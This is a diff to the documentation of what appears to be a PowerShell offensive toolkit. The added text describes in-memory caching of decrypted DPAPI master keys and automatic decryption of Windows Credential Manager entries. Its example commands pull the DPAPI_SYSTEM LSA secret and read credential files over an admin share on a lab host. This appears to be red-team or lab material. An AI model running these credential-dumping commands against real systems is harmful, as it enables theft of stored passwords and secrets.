@@ -692,6 +692,8 @@ Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw DPAPI_SYSTE
 `UserNtlmHash` accepts either a 32-hex NT hash or an `LM:NT` string (only the NT portion is used for DPAPI).
 If a user-scoped master key cannot be decrypted with the current password/hash, `Get-TBODpapiMasterKeys` will attempt to use `CREDHIST` (when present) to handle password changes.
 
+Decrypted master keys are cached in memory (per connection, per PowerShell session) and may be reused automatically by other cmdlets that need DPAPI master keys (for example, `Get-TBOCredManEntry`).
+
 ```powershell
 Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
   Get-TBODpapiMasterKeys
@@ -856,7 +858,8 @@ Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machi
 
 #### Get-TBOCredManEntry
 
-Reads a Credential Manager file and reports metadata plus DPAPI blob offsets (no decryption in this phase).
+Reads a Credential Manager file and reports metadata plus DPAPI blob offsets.
+When DPAPI master keys are available (explicitly via `-MasterKeys` or from the in-memory cache populated by `Get-TBODpapiMasterKeys`), `Get-TBOCredManEntry` will attempt to decrypt the DPAPI payload and populate `Cleartext*` fields.
 Scheduled task credentials (TaskScheduler:Task entries) are decoded into target, user, and secret lines when cleartext is available.
 
 ```powershell
@@ -869,6 +872,11 @@ $keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Na
   Get-TBODpapiMasterKeys -Scope Machine
 Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine |
   Get-TBOCredManEntry -MasterKeys $keys
+
+# Decrypt using in-memory cached master keys (no explicit -MasterKeys needed on subsequent calls).
+Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine | Out-Null
+Get-TBOCredManEntry -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\CRED_FILE'
 
 $userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
 Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserName 'jsmith' |
